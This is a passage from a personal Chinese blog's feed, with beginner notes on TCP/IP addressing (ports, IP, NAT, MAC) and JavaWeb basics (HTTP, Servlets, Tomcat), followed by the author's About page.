<p>端口</p>
<p>在传输层中，用于识别一台计算机中正在运行的不同的应用程序。</p>
</li>
<li>
<p>IP地址</p>
<p>在网络层中，用于识别TCP/IP网络中互联的主机和路由器。</p>
</li>
<li>
<p>MAC地址</p>
<p>在数据链层路中，用于是被同一链路中不同的计算机。</p>
</li>
</ul>
<h4 id="端口">端口</h4>
<p>一台计算机中可以同时运行多个应用程序，例如Web浏览器、远程登陆用的SSH客户端等待。而传输层协议（TCP、UDP）正式利用端口号来<code>识别不同的应用程序</code>，并准确的将<code>数据传输</code>。</p>
<figure data-type="image" tabindex="11"><img src="https://zzggtt.github.io/post-images/1603546021942.png" alt="" loading="lazy"></figure>
<p>常见的端口对应的服务：https://www.shentoushi.top/Public/upload/images/2017-07-09/Baidu_translation_table.png</p>
<h4 id="ip地址">IP地址</h4>
<p>IP协议作为整个TCP/IP中至关重要的协议，主要作用是在复杂的网络环境中将<code>数据包发送</code>给最终的目标计算机。能够让任意两台计算机之间进行通讯。</p>
<p>在TCP/IP通信中，所有主机或路由器必须设定IP地址。IP地址的作用在于从连接到互联网中的所有主机中，<code>识别</code>出进行通信的目标地址。</p>
<figure data-type="image" tabindex="12"><img src="https://zzggtt.github.io/post-images/1603546036787.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p><strong>组成</strong></p>
<p>IP地址由<code>“网络地址”</code>和<code>“主机地址”</code>两部分组成。</p>
<p>网络地址代表<code>不同的网段</code>，而主机地址代表同一网段中的<code>不同的主机</code>。</p>
</li>
</ul>
<figure data-type="image" tabindex="13"><img src="https://zzggtt.github.io/post-images/1603546042612.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="14"><img src="https://zzggtt.github.io/post-images/1603546047304.png" alt="" loading="lazy"></figure>
<ul>
<li><strong>分类</strong></li>
</ul>
<figure data-type="image" tabindex="15"><img src="https://zzggtt.github.io/post-images/1603546053182.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="16"><img src="https://zzggtt.github.io/post-images/1603546080736.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p><strong>全局地址和私有地址</strong></p>
<p>随着互联网的普及，IP地址不足的问题日趋显著，于是出现了一种技术：在每个独立的网络中，只为相应的设备分配唯一的IP地址，对于哪些没有连接尽互联网中的主机，只需要保证在整个独立的网络中地址唯一即可。</p>
<p>这些地址称为私有地址，范围如下：</p>
</li>
</ul>
<figure data-type="image" tabindex="17"><img src="https://zzggtt.github.io/post-images/1603546089041.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p><strong>NAT技术</strong></p>
<p>私有IP地址最早没有计划连接互联网，而只是用于互联网之外的独立网络。然而随着NAT技术的出现，配置私有IP的主机也能与互联网中的主机进行通信。</p>
<p>NAT技术是一种能够互换私有IP地址与全局IP地址的技术。</p>
</li>
</ul>
<figure data-type="image" tabindex="18"><img src="https://zzggtt.github.io/post-images/1603546094513.png" alt="" loading="lazy"></figure>
<p>当独立网络内部有多台机器同时要与外部通讯时，仅仅转换IP地址是不够用的，此时采用包含端口号一起转换的方式（NAPT）即可解决。</p>
<figure data-type="image" tabindex="19"><img src="https://zzggtt.github.io/post-images/1603546098891.png" alt="" loading="lazy"></figure>
<h4 id="mac地址">MAC地址</h4>
<p>MAC地址用于识别数据链路中互连的节点。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[JavaWeb]]></title>
        <id>https://zzggtt.github.io/post/fu-xian-yi-xia-web-ji-chu-zhi-shi/</id>
        <link href="https://zzggtt.github.io/post/fu-xian-yi-xia-web-ji-chu-zhi-shi/">
        </link>
        <updated>2020-09-25T02:28:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="前言">前言</h3>
<p>在《图解TCP/IP》中，了解到WWW是促使互联网发展的重要动力，所以准备复习一下JavaWeb相关的基础知识。</p>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1601000921816.png" alt="" loading="lazy"></figure>
<h3 id="通信协议http">通信协议HTTP</h3>
<p>Web客户端（浏览器）和web服务器之间主要是通过<code>http协议</code>来进行交互。想要快速掌握HTTP协议，推荐通过《图解HTTP》进行学习。掌握基础的<code>请求和响应流</code>。</p>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1601000926412.png" alt="" loading="lazy"></figure>
<h3 id="web"><strong>Web</strong></h3>
<h4 id="1-静态web">1、静态Web</h4>
<p>静态Web对于每个用户来说，看到的都是相同的页面。例如：<a href="https://www.baidu.com/index.html">百度首页</a>，对于每个用户来说都是一样的。</p>
<p>常见的静态Web资源有：html、css、js、image等。</p>
<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1601000933285.png" alt="" loading="lazy"></figure>
<h4 id="2-动态web">2、动态Web</h4>
<p>动态Web对于每个用户来说就因人而异。例如：<a href="http://i.baidu.com/">百度的个人中心</a>，就会从数据库中去加载不同用户的不同个人资料等数据。</p>
<figure data-type="image" tabindex="4"><img src="https://zzggtt.github.io/post-images/1601000937725.png" alt="" loading="lazy"></figure>
<h3 id="web服务器">Web服务器</h3>
<p>​	<code>Web服务器</code>处理来自客户端的HTTP请求，并返回HTTP响应。它<code>擅长</code>处理静态资源。而静态资源存储在Web<code>目录</code>中，Web服务器找到相应的静态资源后，响应给客户端。</p>
<p>​	但如果想要提供动态页面和动态数据，例如，需要从数据库中取出个人中心的数据，Web服务器就显得有些力不从心了。这时就需要一个辅助应用，能够生成动态页面，而且这个应用能与Web服务器通信，并且能够和后端java语言进行交互，从而从数据库存取数据。这个辅助应用就是<code>servlet</code>。</p>
<h3 id="servlet">Servlet</h3>
<p>​	Servlet就是sun公司开发动态web的一门技术，Sun公司在这些API中提供一个接口叫做Servlet。我们一般把实现了Servlet接口的java类也称之为Servlet。在MVC设计模式中，servlet扮演着C（控制器）的角色，当客户请求到来，进入到Servlet，Servlet调用M（业务逻辑）从数据库中存取数据<br>
  但Servlet也需要帮助。当请求到来时，必须有人加载、初始化和实例化Servlet，或者创建或分配一个新的线程处理这个请求，调用Servlet的doGet（）、doPost（）方法。并需要有人创建servlet必须的参数HTTPServletRequest和HTTPServletResponse。当请求处理结束后，有人销毁Servlet，管理着Servlet的生命周期。这个人就是<code>Web容器</code>也称<code>Web应用服务器</code>。</p>
<h3 id="web容器">Web容器</h3>
<p>​	Servlet没有main()方法，它们受控于另一个Java应用，这个Java应用称为容器。<br>
<code>Tomcat</code>就是这样一个容器，如果Web服务器（如Apache）得到一个指向某Servlet的请求（而不是其他请求，如请求一个普通的静态页面），此时Web服务器不是把这个请求交给servlet本身，而是交给部署该Servlet的容器，要由容器向Servlet提供HTTP请求和响应，而且要由容器调用Servlet的方法，如doGet()和doPost()。</p>
<p>用一个丑陋的图来形容就是：<br>
<img src="https://zzggtt.github.io/post-images/1601000945479.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[关于]]></title>
        <id>https://zzggtt.github.io/post/about/</id>
        <link href="https://zzggtt.github.io/post/about/">
        </link>
        <updated>2019-01-25T11:09:48.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>📝温故而知新</p>
</blockquote>
<h2 id="twitterhttpstwittercomzer0ney1">📒 twitter：https://twitter.com/Zer0ney1</h2>
<h2 id="wechatz807852704">📙 wechat：z807852704</h2>
]]></content>
    </entry>
</feed>